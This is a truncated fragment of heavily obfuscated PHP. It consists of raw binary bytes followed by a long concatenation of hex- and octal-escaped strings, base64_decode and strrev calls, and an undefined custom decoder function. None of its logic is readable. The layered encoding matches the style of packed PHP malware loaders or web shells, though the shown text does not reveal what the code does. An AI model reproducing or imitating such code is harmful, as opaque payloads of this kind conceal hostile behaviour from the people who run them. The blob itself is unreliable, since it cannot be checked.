ïh0¿ÉZÿ!kü·üŸ½}Xÿ_{lÛÖÁñ¨İÑÀPÓş`çü¥<')."\x66\x7f\xff\xf4\xa9\x0\xe\x19\x10\xec\x10\x9c\xce\x83\x58\xca\x12\x3b\x65\x2a\x43\x5d\x41\xe9\x6e\xe\x6f\x7\xd8\x91\x4e\xca\xe1\xf9\x2d\x80\xc\xb7\xc5\xa2\x3d\x9c\x6f\xd1\x22\xed\x1a\xf7\x8c\xa2\xd5\xf0\x7b\x83\x1a"."\x18\x7b\x6b\x2c\x4c\xd7\x14\xcf\x85\x69\xb5\x35\x1e\xb1\xd7\x92\x1a\xd\x1c\x13\xd4\x79\x4b\x45\xba\xdb\xc2\xab\xb5\x1a\x2b\x3d\xa6\x1b\x86\xe\x85\xe9\x59\x15\x2b\xd2\x2a\x6a\xc2\x1a\x78\x5f\xe7\x40\x75\x1c\x57\x13\x12"."\127\53\370\66\346\53\4\55\274\175\160\344\27\51\234\135\346\111\221\70\331\315\73\73\331\200\110\222\345\120\56\327\247\11\117\36\64\222\236\114\270\274\25\52\302\4\136\21\117\12\257\116\304\102\64"."\x92\xb1\xa6\x7\x4e\x23\x7f\x18\xb5\xa1\x47\xa7\x62\xce\xe0\x96\xc4\x8c\xa1\xb\xac\x3\x11\xc4\x3a\xf\xff\xc8\x39\x4b\xca\x41\xf2\x41\xad\x0\xe\x9b\x87\x7a\x62\x91\xae\x50\x6c\xd\x40\x40\xf2\xfb\xb0\xf4\xec\xac\xc7"."\x96\x5d\x6\x2c\xa7\x57\xf1\xab\xd0\x4d\x3a\xa1\xfa\x59\x20\x84\x85\x9c\x57\x21\x27\x99\x17\x60\x62\xb8\x7b\x65\x5d\x18\xc5\xd7\xa2\x9d\xb6\xf\x3f\x60\x59\xcd\x74\x34\xfe\x77\xfa\x4c\x67\xba\xf2\xeb\x99\x78\x24\xd0\x64".base64_decode('9mHnh93JZXZ0KMrKEcIkQiPUENyAJSYt1WVc1s4PyXjqykC6w6NfhM7l8KLSTJHxCAk7fiWzdg==')."\x52\x94\x36\x14\x51\xb2\x98\x54\x84\xa0\x74\x49\x4d\xf7\x62\x8a\x2e\xb8\xa9\xb4\x87\x7a\x3b\xd5\x18\x89\x59\x9e\x59\xa3\x32\x18\x0\x1c\xc0\x89\xfd\x5\xa\x25\x71\x1c\x1a\xa4\x17\x38\xb0\x9c\xfb\x6b\x39\xb3\x88\xde\x7b"."\x5d\x32\x35\x50\x53\xcd\x3a\xec\x9f\x67\x4a\x49\xd0\xe3\x1e\x1b\x8e\xaf\x30\x66\xe6\xf5\xa5\xb6\x91\x9c\x97\x4b\x79\xea\x8e\x9\xc5\x98\x0\xa3\xda\x86\x7a\x5f\x63\x9d\x84\xb0\x84\x11\xf5\x1\x63\xa2\xf2\x0\x4c\x5c\x6d"."\103\235\147\266\152\33\347\315\203\30\11\222\120\157\42\252\223\175\62\26\246\273\26\20\341\231\316\72\1\5\1\10\216\214\100\154\5\304\352\264\160\367\362\110\167\270\231\272\3\40\314\6\2\35\44"."\205\324\175\356\302\134\162\356\42\44\266\337\40\374\41\141\160\10\213\250\243\140\153\330\116\57\113\332\0\322\244\61\34\220\306\152\221\250\336\111\170\172\135\225\37\106\242\40\273\366\270\163\345\246\2"."\xfc\x5b\xd7\xa5\x6f\xa1\x80\x21\xcd\x9\xdc\x62\x49\x31\xe8\xb3\x6c\xa6\xba\xdf\x25\x8a\x31\x5b\x3\x82\x1b\x21\xe9\x6d\x44\xc8\xda\x59\x5a\x29\x49\x4b\xab\xdb\x32\x94\x2f\xf3\xa0\x6c\xd9\x4d\x34\x85\x66\xe6\x1c\xd7\x22"."\231\135\367\64\136\256\253\257\106\113\63\2\171\113\217\112\1\302\263\46\24\350\125\274\205\260\113\45\154\220\335\172\345\313\273\107\135\3\164\241\47\47\302\27\144\321\23\237\156\312\301\221\105\352\210"."\xcb\xfb\x44\xc6\xd4\x9c\x2\xc1\x42\xea\xc1\x57\x3\x47\x93\x5a\xda\x56\x2f\x1b\x61\x5a\xd8\x11\x10\x3f\xdd\x8c\x74\xb3\xa2\xba\xbe\x6e\x6b\x81\xa9\xf2\x5a\xce\xe7\xa8\x39\x65\xdc\xcc\xc2\xd\x44\x5b\x92\x59\x73\x48\xcb".base64_decode('Tmn8Jq08uAPPsoxQMiIApeSqGqnYgXZKB9j0YkdizABKNySQNlq4fZff64qu5u0ece+6Sl5oAQ==').base64_decode('S0cq8F74inLqVNDL04qc1MfMJ80zepJjPVPse+mFtGLFVMqTmv2qDRxBKhapWOKg41MeWgCKNQ==')."\xae\xd8\x2\x86\x20\x6\x7f\x8b\x98\x12\x90\x8e\xa8\x58\x9d\x94\x21\xf4\x4b\x77\x30\x69\x43\x35\x86\x56\x5e\x84\x38\x56\xc5\x19\x36\xdb\x12\xe9\x7\x2d\xd5\x37\x4c\x40\x3a\xe\x17\xeb\x68\x99\x98\x1d\xea\x43\xc0\x8f\xb8".base64_decode('RhBLV/rSI/JLl8EcGgrsWQT/ZCtfa5Kd6LDoShhXEEaJFQsM3JZ32kOCgBGeG7z6eYhYJAplAw==')."\x26\xb5\xcb\xe3\x56\x52\x61\xe1\xe6\x95\x14\xe4\xce\x18\x3f\xbd\x50\xaf\xe2\xb9\x7d\xa\x5a\x53\xb5\x5c\x2b\x64\x14\xd\x16\x99\x4c\xec\xd3\x1b\x8c\x99\x92\xdd\x21\xc5\x98\xc9\xe3\xa7\x16\x92\xb4\x97\xb5\xc4\xa\x29\xf4"."\xba\xac\xc\x43\xc7\x98\x42\xe7\x3\x19\x48\x96\x38\x46\x36\x8c\xee\xa8\xde\x41\x98\xe3\x28\x72\x63\x96\x93\xf0\xd0\x7d\x2c\x5\xdb\xba\x4b\x78\xbf\x54\x90\x99\xb7\xc3\x7e\xb4\x88\xe9\x4c\xf0\xab\x5b\x98\xec\x4d\x84\xa4".strrev('ƒ•(`¡4*J#Õ©1Ù›â¨íH\' â³í?'."\0".'^c1 \\+·[ÜtŸ´¹5Ÿñ	’{ÏÓÔ/‹').strrev('ñ²öÎáŸ%J,zÎNÏ=W–†˜òÊĞöØ‰ÜFºÜ,zoEL4Xw†7´xÁ{Ò.ƒ')."\341\346\333\33\247\167\106\272\127\124\115\40\174\111\227\122\204\107\106\22\341\256\362\70\157\15\74\56\332\53\234\11\261\310\160\50\206\216\351\151\270\245\63\332\252\224\211\104\53\301\43\270\41\21\311"."\x85\xa9\x3c\x32\xf8\x8d\xda\xfe\x4d\xec\x64\xd7\x44\xe\x78\xe9\xcd\x54\xea\xe2\xef\xf\xe8\x3\xb3\xeb\x96\xf6\x9f\x5c\x57\xdb\x1f\x5c\x1a\x98\x25\xc4\x85\x9c\x8a\x29\x86\xe3\x53\x44\x3b\xb8\x3d\x35\x95\x47\xd0\x9d\xad"."\42\222\354\131\30\307\253\202\120\60\20\200\206\305\107\260\77\210\56\371\202\62\21\176\145\376\343\312\366\40\170\36\42\316\375\233\171\72\137\346\117\7\35\125\4\312\255\30\165\64\135\104\42\154\14"."\242\56\105\204\337\144\353\361\65\161\61\255\336\70\17\362\162\364\127\325\116\312\62\223\177\75\152\126\252\172\125\65\243\7\373\75\106\374\152\124\300\262\345\302\222\24\40\155\247\112\324\243\232\234\67"."\151\362\117\242\2\152\25\352\132\265\154\140\67\120\121\224\371\44\0\52\101\345\51\360\131\356\3\101\356\334\74\330\346\351\43\331\134\206\245\220\5\132\215\43\45\311\223\175\33\270\201\126\302\231\57"."\357\210\234\270\242\263\253\73\332\163\122\54\236\350\135\271\152\365\32\160\27\334\204\230\72\250\371\121\244\4\376\267\203\344\370\20\34\301\267\107\126\322\363\212\351\4\125\216\123\104\22\40\122\307\351"."\xe8\x45\x91\x4b\x82\x44\x2a\xa5\x64\xc1\xea\x49\xbc\xb6\x60\x2e\xef\x36\x4c\x91\xa3\xa7\x68\x92\x33\x8e\x3b\x45\xea\xca\xae\x4f\xae\x18\x12\xfb\xfa\x9d\x1\xb1\xc\xd2\xe6\x8\xe\xda\x4\x6d\x5d\xa9\x25\xe9\xc8\xb\xe"."\340\174\374\352\143\50\164\135\250\354\154\72\131\306\242\100\204\164\376\252\60\62\62\122\370\320\347\301\161\274\350\142\376\16\25\37\364\270\74\111\161\340\351\300\47\366\162\352\2\32\135\76\157\140\36"."\x7c\xcb\xdd\xff\x6e\xf0\x1b\xc3\x9e\x74\x79\x10\xdf\xe0\x1f\x36\xc7\x3d\xe1\x32\x17\xc0\xc7\xb3\x6d\xa9\xcb\x1e\x2a\x36\x6\x5d\xda\xcf\x3c\xd9\xca\xa0\x2f\xc0\xdc\xa8\xcb\x91\x6d\x6f\x42\xfb\x8a\x6e\xa2\x1d\x65\xc4\x40".base64_decode('RAoHN3GmbdukzYXHRdrJCSCt9fFjAVySUK6QvY/Bgz5N+u1H8bbXIT+uR7qqFHvwlOp7BGl+bg==')."\130\52\5\346\206\205\336\115\312\303\10\121\236\243\135\321\35\224\274\16\307\12\232\326\62\216\113\23\254\254\133\306\143\312\223\145\36\277\57\352\123\110\350\334\246\54\33\172\247\341\347\0\66\12\74"."\146\176\172\116\351\54\206\316\211\74\26\11\37\75\262\151\171\332\142\317\0\300\350\215\174\114\270\343\47\1\345\334\342\144\360\160\74\42\334\352\310\227\10\224\163\231\51\135\113\24\205\367\22\346\146"."\137\276\261\44\330\140\300\67\302\53\15\201\104\374\170\134\170\315\200\362\307\263\253\171\206\221\307\53\17\75\320\331\123\271\335\121\63\231\66\106\170\14\252\52\246\62\245\374\160\134\172\366\240\101\107"."\xf9\x56\x90\x53\x11\x34\x21\xae\x2a\xc1\x76\xcf\x5e\xc6\xe7\xbe\xd5\x5b\x79\xce\x70\x53\x5e\xff\x4d\x31\xb3\x60\x1a\x53\x4e\x9a\x4b\xe5\xf1\xa\x48\x14\x40\x93\x1c\xd2\x41\x4\xa5\x4d\xf2\xd0\x43\x43\x52\xed\x6f\x51\xf9".strrev('E‚æUÙ;w™kC%i\'ƒœ(óú¬ÉVü“•Ü%) ÷“VÑ3'."\r".'ñUµ#7	{„'."\n".'Òuk‘Ù')."\366\170\272\50\234\312\110\367\144\314\205\67\301\76\351\316\111\272\261\10\30\144\253\62\304\161\31\135\132\170\242\321\331\30\17\261\227\30\340\321\40\100\245\345\250\331\6\317\213\300\262\20\267\340\170".strrev('s>O¡V0YÌõ0‰ÈáZ¯ŒŞyêØ@BÏp¨Útf+ÔX¨m£Ñ]}¢'."\0".'§ñ†q^T').base64_decode('FugbgCh46Qwj5JoTZBlrFhGerAzEQmdRVy1LLPRGJOuhh0VcYqz9akNm5eqVQgSD1EKqgx4aVg==')."\17\222\171\163\124\242\174\337\200\207\212\53\115\160\267\46\212\253\243\343\305\264\4\305\73\150\113\161\161\4\31\266\5\61\47\367\21\202\263\10\4\61\200\256\340\2\350\303\221\105\40\353\245\270\277".base64_decode('mrFshoLDlO4CGzdsp73LoY8KGQS2FFozdN/y8G2eqJQaGKQaoqpmqfclGJLcxoUMaZHfkV/iaQ==').base64_decode('l0Hl0ZeKGgglzocRIytSO+0hSyZ/cl+62JYqMnuMFKCDQaoKB1Mw5rcdx18o2lT/nBD4oaAzCg==').base64_decode('aVnDcVd6vEB+6msvdKK6hDgHujDmZ/sGNgJFaVSwyJ4J8I3CmcTHfKjr9cgkBEnfgtTdNpO7CA==').base64_decode('lfBoHLUovKPnT5gqIuJZZaRFPKwi39Hgl9/8W74/0WWMhYao5zU7j4808ne21Fd40ibrrqDyyg==').base64_decode('Azb0rTfC3jkYkk/Z0E1WTCN7WUL1wk1B7s95nnjjE+R9IMYxzWFcxnS2JRdZFIwD14nyV43wKw==').base64_decode('uv18H1We/qLNgUQ6wx8Vg/7yn7XVeu8vyqd1yOzwJ8pWmOP4BMonv6LSv7y/qz+hDtctGoODpA==')."\xb3\x8a\x4f\x7d\xf9\x84\xe\x92\x36\xfa\x42\x1f\x8e\x7a\xea\x7\x78\x60\xd1\xc7\xf8\x88\x5a\xa9\x4c\x6f\x8c\xbe\x90\x26\xdd\xb6\xf7\xc6\x3a\x3d\xba\x19\x90\x15\xfb\xbe\x31\xe3\x6f\x45\xed\x69\xbb\x94\x4d\x33\x39\x29\x69"."\321\316\216\230\232\334\237\46\257\274\141\362\336\313\367\76\166\335\344\5\267\354\336\271\153\362\232\207\170\74\207\105\233\231\27\63\72\171\336\45\173\166\135\273\167\373\143\157\134\271\375\255\207\317\337"."\173\327\3\124\13\367\372\133\270\122\356\304\205\247\115\136\276\143\342\302\163\367\336\167\306\344\103\27\115\136\173\372\33\127\137\364\372\51\247\301\232\310\63\377\361\241\342\120\111\202\202\27\231\274\341"."\341\211\207\57\174\343\262\253\367\336\165\227\222\337\245\112\346\131\145\121\220\371\231\70\163\313\33\247\337\66\161\341\305\173\56\273\276\242\0\157\240\174\6\351\360\56\77\173\317\267\317\120\122\312\13".strrev('•¹Şìßí‰¬ÿ<šŞQi•)xíº…eı×{µœW“B•Tş!yGu¹î¶‹‰„ğÊ!¦äg°µ').base64_decode('W6KVFRFq5SI/r78yfxxxtc02HcL1d1Gekift2fYo6Q+HmDpzE3edueeGU/dsOwdm4qq7Ji763g==').base64_decode('5Lab9ty4XVQLWOUxX6EV3H3a3vu3TF55v8hIF3Nak3kYRvE81OqONbjnkYv37LqGIsm5p+057Q==').base64_decode('wYlrdkxce4podmLnTgnlaJA9T1uFjJ5E44GQDko7qUJJeSFZJV30gI20gLGq/MkuPDeTXblUzA==')."\xb7\xd8\xe8\x61\x61\xd3\x74\x42\x1\xa7\x37\x4d\x9f\x51\x4b\x7e\xeb\xa6\xfb\xa6\x53\xe1\x14\xb\x53\x1a\x48\x23\x58\xa3\xd3\x9b\x66\xd4\xb2\x8f\x3a\xf0\xe1\xb8\x11\xc8\xbf\xf2\xe0\x5\x70\x9c\x4b\x9\xd\x50\xd4\x76\x96"."\262\75\204\356\120\215\301\306\40\356\132\113\67\320\166\344\13\255\362\365\31\36\356\25\233\207\74\320\363\155\204\277\255\207\172\100\335\246\73\152\27\125\333\237\106\264\334\317\50\233\100\316\1\162\316".strrev('[{òÇ¶UWÅÄæu¹¼WŠ‚\'¥ä=)róÊÛ•ÆûÜ¶&{ı“ÆºÜ’x•­¢ş³\\m€(—’¼ß')."\xc3\xcc\x13\xa7\x5e\xb3\xe7\xb2\xb2\x9c\x68\x8f\xa2\x29\xd7\x31\xb2\x0\x43\xf8\x32\xd2\x21\x88\xbc\x5a\x84\xa3\xf8\xff\xcd\xc2\xe1\xac\x76\x13\xbd\x3f\xe6\x11\xab\xfd\xbd\x85\xf1\x52\xde\x4f\x39\x60\x7f\x5c\xf5\x2f\x5e".strrev('²ı[½×«t¨¶”G’Q€_(â)áK¾4Ë°»¯*İo©¤Ù¦¿“òsDÜ”ÿ7Wæğğ½?7½ejö').base64_decode('sv5SBU1/nCwWkz5IS3Yz5RkpNYv38dTyJ1XLocCK0Ns3v/qc65i/xJLp03t+epfnt9JTpUhaUQ==')."\xb5\xab\x29\x78\xac\xab\x5a\x96\xde\x92\x95\x2e\x6f\x92\x29\xa2\xfa\x4b\x25\x6c\xb0\x6a\xa5\xaa\x0\x10\x33\xb0\x41\x44\x44\x7d\x9e\x57\xe7\xc8\x39\xca\x2f\x74\x74\xca\x1f\xb5\x93\xd2\x53\xa3\xf2\xcd\xb5\x35\xb9\xb4\xd6".base64_decode('OKdp3gnkL485HvVoSwU0mSOf+CbbscFBpD3yMVQcG51w5aVAT7QEo3iBDYmWJ5/srecpXxgovw==').base64_decode('HVCeNmQqBZxEUe1yXYgIqhy6LXzeU3kpS8zDEH4UhYzWkCsjmR2WA2BkBRCbnL0sW556GL+pEA==')."\4\46\363\151\126\22\65\327\266\265\234\221\37\7\1\342\114\247\151\246\263\210\66\324\114\315\41\35\241\61\105\367\42\351\71\335\125\204\37\240\55\21\240\217\371\322\323\243\35\53\251\57\215\221\35"."\255\354\161\16\176\122\340\337\75\214\354\303\336\307\237\127\205\204\316\336\345\221\156\105\51\136\211\320\133\333\272\365\120\117\117\325\4\230\31\176\271\111\237\375\14\254\207\166\351\33\356\374\153\61\71"."\152\151\51\152\267\333\74\235\306\116\327\234\142\252\31\125\310\202\240\143\315\62\110\336\150\261\5\105\152\150\21\155\220\214\311\317\276\170\162\315\222\305\101\13\112\6\202\307\121\62\36\244\332\345\371".base64_decode('4+nsorGow6xXSWy7dFqqaYsNjUO0uYZd1ddoGbK7C9OaJeWFxQO9i4OGmkgXVMzG86CQiSniyg==')."\152\252\31\41\345\31\45\366\102\146\253\221\137\131\131\204\126\36\110\251\111\370\222\172\206\311\213\313\124\201\26\27\226\54\246\347\176\324\137\17\262\300\342\140\141\211\72\333\114\136\127\331\30\110\52".base64_decode('pHxa5wKe6towPSDeUhVHvDmEgkgVTKN6qGQFoYqhkRqm2Cz3GegoJPRQ2QRP8Lw/5yrKxSXqLg==')."\x81\x69\x1e\x14\xe5\xeb\xc2\x9b\x36\xf1\x8a\xe8\xd3\x8f\x27\x9f\x5c\x19\x7\x26\x49\xe5\x49\xa1\x82\x55\x1e\x45\x51\xb2\x3c\x8e\x82\x40\xc6\x91\xd\xd3\xdb\xc\x5f\xe\x6a\x26\x19\x83\x79\xf8\xaf\x2c\xd3\xd9\xbd\x5c\x6"."\xf8\x9a\xf5\x24\xf6\xa1\x1a\x31\xb\xf5\xf7\xd5\x4\x66\x9d\x7c\x72\xd0\x42\xc5\x7d\x54\x17\xc6\xb2\x1\x91\x9b\x87\xfb\x3\xde\xfc\x64\x24\x0\x7a\x91\x11\x22\xca\x73\x72\xb4\x3b\x11\xf0\xec\xc0\xe0\x2c\xe9\x50\x41\x28"."\350\153\124\153\277\271\171\111\237\340\321\6\60\115\147\242\25\165\356\220\323\265\32\26\42\122\220\163\147\142\225\370\154\355\226\214\273\140\124\55\267\323\100\225\166\261\372\70\75\13\60\221\171\310\373"."\204\312\122\371\52\63\7\276\372\35\52\24\74\204\13\3\124\67\43\153\45\203\202\332\160\175\215\100\112\372\53\300\54\214\326\225\305\123\45\374\262\4\372\256\43\213\36\41\364\332\56\12\352\50\342".base64_decode('SV0iEgZLKZhCsETyYidVtAquh3pq7LJiOnvAd70xYvAs0zWQ6jVPZ4+dTSeUgKcgyRQdXExbIw==')."\xdc\x76\xb6\x79\x3a\x1b\x84\x93\x31\x4d\x52\x9e\x51\xc4\x6a\x8d\x90\x82\xd3\x35\xa4\xd9\x39\x43\xc0\xb1\xe8\xda\x64\x7b\x16\xa6\xed\xf0\x7c\x7a\x6f\xc\x8c\x7e\x43\xdd\xa0\x25\x73\xdc\x37\xf8\xef\x8c\xe3\xc4\xf6\x44\xdf"."\x76\xcf\x12\x36\x9c\x99\x34\x32\xea\xc8\x78\xfd\x41\x7a\x43\xc7\x33\xc1\x33\xee\x3d\xb1\x68\x22\xda\x8a\x6f\x1f\x7b\xaf\xf2\x78\xdc\x5c\x3c\xb7\x38\xdc\xf3\x83\x3c\xdd\xa1\x49\xbb\x50\x28\xc5\x1c\x82\x61\x9\x42\xc\x60".base64_decode('Q7GUzwsjCorEYqNtrv6njynymOmBKdK1PgPVKEDCzPWW0CcD9JNs6QnqbseBaMVzOvXRbqYDfQ==')."\334\163\120\163\75\232\45\243\71\207\164\147\200\71\325\24\215\156\100\3\2\352\204\50\4\201\246\312\345\126\103\225\120\340\335\317\32\137\115\155\140\126\135\115\145\12\67\216\361\246\123\243\170\375\304".base64_decode('OEmExzWBkWCOA1o7I+HuhB4BHqKhcUGgXhr1W458dYB/twq12qLJoBrwDKsKaPh1fEKYfZh5jw==')."\244\226\203\64\153\243\77\374\306\372\372\172\177\175\3\371\213\266\212\350\231\273\11\135\5\52\131\352\353\233\330\137\236\300\256\304\1\5\275\51\314\253\24\324\307\177\106\115\23\72\4\133\56\71\174"."\x97\x90\xc5\xed\x6b\xa5\xbe\x18\x34\xda\x35\x98\x16\x69\xb6\x42\xb0\x8f\xb9\xae\x47\x5a\xeb\x79\x59\x5e\x63\x57\x9e\x10\xca\x29\x4f\xa0\xc7\xe1\x2d\x83\x21\xf\x8a\xab\xf7\x6a\xf8\x4d\x78\x4e\x82\xdc\xc\x2a\xd0\x61\x71"."\xfd\x45\xb2\xc9\x65\xb3\x88\x5f\xcd\x48\x37\x28\xe1\x7c\xba\x4f\x6d\x2c\x80\xd0\xe5\x91\xf2\xd5\x20\x3f\x26\xf8\xd5\x27\x6\xa1\x10\xa7\x74\xca\xcd\x13\xc9\xe7\x75\x84\x4f\x63\x8\xd3\x94\x12\x33\x4c\x23\x14\xd1\x2d\x65"."\232\25\347\376\64\250\252\212\260\144\161\301\304\102\131\341\262\214\6\273\105\115\374\365\112\376\234\56\300\255\312\322\313\330\243\272\344\122\150\360\104\21\142\140\244\133\24\342\136\132\161\134\102\141\211"."\x1b\x91\x92\x5d\x68\x5d\x4b\xcd\x54\x60\xf0\x98\xb3\xad\x61\x4b\x59\x1\x64\x2\x74\xa5\xa8\xa\xcf\x45\x34\x23\x8e\x24\xe1\x2d\x49\x9a\xf0\xd3\x8e\xfa\x69\xbf\x9b\x24\x14\x9\x21\xb\x89\x77\x3d\xb9\x79\x10\xf6\x57\x3"."\xd2\xc2\x83\xec\xb1\xa0\x30\x7d\xf9\x9a\xdb\x88\x35\x1d\x58\x31\xc9\x6e\xf9\x4\xb3\x79\xf3\xdc\x7e\x94\xab\xbf\x63\x48\x99\x3d\x54\x82\x88\x7f\x8a\x86\x3a\xc6\x84\x31\x82\xab\x6f\xb4\xa\xcf\xf8\x4a\x5\xe5\x49\x65\x65"."\x42\x5c\x77\xa2\xa2\x0\xc4\x57\xe6\x66\x2a\x26\x55\x72\xd3\xf8\xb2\xdc\xcc\x7\x7e\xab\x78\xd6\x43\x75\x8c\xcf\xc5\x5a\x8a\xc2\xb3\x3\xef\xa6\x49\x6d\x53\xac\x63\x44\x39\xe4\x6\xa\x45\x7b\x88\x60\x82\xa3\x2\x8d\xc4"._kodDe('MkDjAnsXxUJfELWbZj/S1Q9UITOnRgP53ZBQGrFQlYBBUAxjkBdxmfXlziFJin5Bivd5FmLC3S0=').strrev('Rp¢ P©«Áî–£Ò=Ó¤ní¾¦T^$‹0è5TßÙe‘šªï#E¸¢”:@O³ÑŞå')."\x8e\x8f\x82\xa6\xb0\xd5\x26\xfc\x75\xa1\x26\x35\x9d\x1c\xa9\x88\xe8\x8d\xe7\x71\x5c\xc4\xe2\x51\x4e\x4a\x30\xba\x9b\x35\x13\x0\x9\x1c\x2b\x6d\x81\x56\xc0\x34\xce\xcb\xe6\x53\xae\xc1\x26\xe4\x87\xd4\x62\xde\x34\x8a\xd6"."\11\333\243\364\370\332\231\27\343\307\245\374\3\21\21\35\73\261\71\107\61\206\256\136\32\122\360\350\252\174\214\222\233\16\27\35\174\126\131\45\336\225\120\201\362\214\273\240\25\64\11\232\251\204\150"."\355\170\137\153\24\207\300\15\236\217\106\153\66\273\314\321\362\246\160\27\345\305\70\265\0\274\320\153\23\36\227\276\1\242\26\242\165\365\226\321\317\25\202\204\323\220\350\53\147\60\321\70\104\233\31"."\150\4\205\252\231\370\352\35\337\100\244\166\140\320\361\44\20\174\247\34\37\262\37\144\254\3\344\350\46\367\104\230\307\76\276\247\140\103\164\34\2\261\321\246\333\313\27\50\73\236\246\126\104\370\205".strrev('È¾{"_à×‚W8ñLÚ#Nk*!5“Õ§Üq]±äŠ½I&¶_Ô©*³ìE÷Ö4¾'."\n".'†D')."\x56\x15\xe5\x14\x2d\xf\x51\x88\xf4\x4f\xb8\x1a\xdb\x68\x15\xd8\x1b\x58\x8a\x40\xa2\x2c\x58\x6e\xc9\x42\x4b\x28\xaa\x69\x24\xa8\xb0\x13\x8c\x99\x71\x91\x1f\xc1\x17\xb0\xa4\x5\x8\xfb\x94\x3b\xc8\x6b\x57\x9d\x89\x1f\x5b"."\44\256\251\204\243\112\377\240\126\121\47\355\101\136\32\240\0\47\126\64\123\166\61\115\167\164\305\251\136\336\215\231\103\152\220\151\145\340\212\221\57\352\250\125\120\37\254\12\121\244\53\65\224\162\113"."\252\107\127\345\201\55\22\122\364\217\25\226\332\337\240\11\136\134\347\65\363\300\154\45\201\345\257\306\226\227\111\263\231\240\200\153\346\60\111\136\274\224\24\227\354\145\274\62\32\320\153\52\227\214\326"."\xf2\xb4\x2\xe6\xa8\x92\x8e\xc0\x51\xd3\x48\xb5\xf4\xb1\x1b\x39\x32\xb5\x8\x6b\xb3\xa2\x8\x4f\xa3\x9c\xa1\x34\xab\x57\x53\x1c\xaa\x5f\xd4\x8b\xb3\x58\x2d\xa5\x4a\x53\x2c\x49\x81\x68\xa\x31\xd\x28\xc1\x1a\x9\x24\x48".base64_decode('GDdRX83f0OhHB+GqqT0eM2GXI+tMQQN6UEdSB4ZHkE/msRW9Beb6UXqpY/4uxXwyx5gixJQKVQ==')."\x22\x2f\xf5\x6c\xb9\x55\x52\xb9\x2a\xa6\x48\xe7\xb0\xa0\xc9\x6d\x1e\x3b\xb2\xb2\xc\x64\x25\x78\xd3\xe1\x55\x34\xc9\x83\x71\x27\x94\xde\x7d\xab\xac\x12\x78\xbd\x4f\x55\x2b\x63\xa5\xa4\x8e\xaa\xb4\xb0\x23\x51\x36\x57\x96"."\x94\x20\x90\xaa\x93\x54\xd0\x2a\x48\x9a\x8c\x4e\xd8\x22\xb2\x52\xd1\x98\x22\x1d\x80\x92\xbb\x15\x82\xa3\x79\x6d\x1d\x75\x2b\xe4\x91\x95\x76\x8d\xb\xe7\x2f\x54\x89\x9f\xee\xe4\xc2\x64\xcc\x51\x3\x98\x2a\x70\xcf\xf1\x4"."\270\125\204\247\264\210\22\271\106\115\364\20\204\42\205\236\216\236\240\210\152\21\253\217\113\164\244\143\340\126\264\14\60\307\314\24\324\225\263\122\132\147\164\171\244\65\324\331\26\211\257\320\206\350\245"."\xb3\x54\x98\x27\xdd\xd5\xd9\xaa\xd4\x1d\xa9\x92\xc7\x17\x5\x93\x9e\x73\xb0\x23\xf6\x26\xc5\x23\x7e\xf4\xd3\x9f\x24\x47\x1b\x7f\x5a\x1c\x9\x1d\x79\xf8\x63\x83\x82\xca\xe4\x3\xcd\xde\x6a\x39\xf6\x99\xc5\x8a\x1a\xf3\xd4"."\xc8\x3f\x5b\x51\x86\xde\x9\x54\xc9\x9d\x95\x2\x6b\x25\x73\xa1\x68\x56\xe6\x1f\x37\xa9\xae\xbe\xd2\x63\xa5\x40\xa9\x4a\x6f\x20\x7f\xf5\x16\xd8\xb\x8c\x6a\x6e\xc2\x14\x99\xf9\xa9\x3a\x6f\xe5\x47\x2c\xc7\x92\xb\x1c\x4b"."\214\253\265\207\332\272\42\335\172\250\263\63\272\312\143\114\223\126\37\313\124\146\101\2\234\267\244\172\227\126\143\74\57\214\225\11\171\370\124\251\256\317\25\202\117\345\260\204\177\64\204\147\353\2\336"."\361\321\215\121\171\355\23\202\312\133\272\205\242\141\71\246\22\301\337\144\105\63\167\43\233\125\322\350\15\222\22\54\171\167\322\252\115\351\274\1\214\123\24\323\253\145\210\105\226\167\44\376\327\135\265"."\322\122\267\331\22\212\351\302\151\12\177\114\257\225\327\343\155\123\276\27\134\31\363\277\175\213\330\47\357\111\165\346\13\25\137\101\267\331\211\16\70\172\36\27\211\352\114\160\257\313\46\10\177\122\34"."\57\250\367\323\301\64\32\357\23\304\17\243\1\56\15\310\163\15\315\5\225\320\126\370\101\333\262\231\320\23\117\100\50\100\44\24\4\0\356\321\26\55\173\114\271\334\266\314\363\124\162\105\33\354\275".base64_decode('PJ7WR0dBcg7IMZGQsMSSRctTqnSAJGtSKicyaM1aPX/2Wyi3a4vR/ZNsgDklDucKrkcI0aGapA==').base64_decode('KlOCs6Srm+Ai8BMN/DIjtfIcSBVG7dx4RYRHaNeJvRZq4PRdyPygrUKXmZtR62Mf++KyEB85YA==').base64_decode('mG7lI7y8+P+fgjwxrnjbd8q3QLF9eSzfmJJ2xh6V4gGMURgttLar1r0phqqsK+beSH0L2WOQ5w==').base64_decode('efuSJ2ilPL0fISQIZpzqLTnq2lb6NpP/9MMv7oXlneDUDZqsEwjotRRQIrpMKetgpQg5KRh5zw==').strrev('Ò‰\'=c"5[õq–¡“ù)w|†0„ÖÑç®8±r8>¨SB}ëfåØ§Ê›o½Ë®¦šÕï¤°«')."\x4a\x81\x11\x4b\x30\xc6\xc7\x9e\x28\xe7\x54\xaf\xfc\xa5\x51\x65\xf5\x9\xe2\xaa\x1a\x5a\xe\x31\xf\xdb\xa0\x9\x59\xe6\x41\x64\xc8\x32\x71\x83\xf0\x64\xe3\x51\x41\xa3\x50\x90\x37\x32\xea\xbe\x4a\xfe\xf7\x78\x28\x81\xb4"."\xde\x44\x87\xce\xfc\x84\xe9\x5c\x39\x23\xae\xec\x85\xf2\x96\x94\x47\xc2\x8d\x69\x29\x1f\xe1\x37\x43\x9e\xd8\xa2\x72\xe8\x53\x5f\xa7\xe0\xb7\x45\xd2\x9d\x5\x64\x27\xfd\xec\xe1\x77\xc6\x0\x30\xb5\x4a\xbc\xc7\x17\x82\x7e"."\102\155\304\331\70\130\171\357\117\65\352\200\216\120\15\46\124\35\33\266\331\331\52\240\236\312\40\203\266\130\223\350\240\56\62\156\41\221\116\363\247\333\31\175\120\311\32\56\313\262\367\133\53\362\341"."\x7b\xf3\xd5\xde\xb5\xe5\x56\x1a\xec\xa7\xcd\x1c\x14\x87\x1c\xd5\xc1\xa1\xd4\x32\x2a\x7f\x99\x7d\xca\x87\xec\xc5\x1a\x81\x17\xed\xab\x3c\x2f\xaf\xbc\x72\x5f\xf6\xa2\xbd\xf2\xd6\xfd\x27\x3c\x90\x2b\x3d\x62\x14\x8\xfc\x25"."\xad\xa2\x23\x11\xcc\x82\x38\x5a\x54\x9c\x4e\xca\xf\x26\x2\x72\x65\x5\x62\xe5\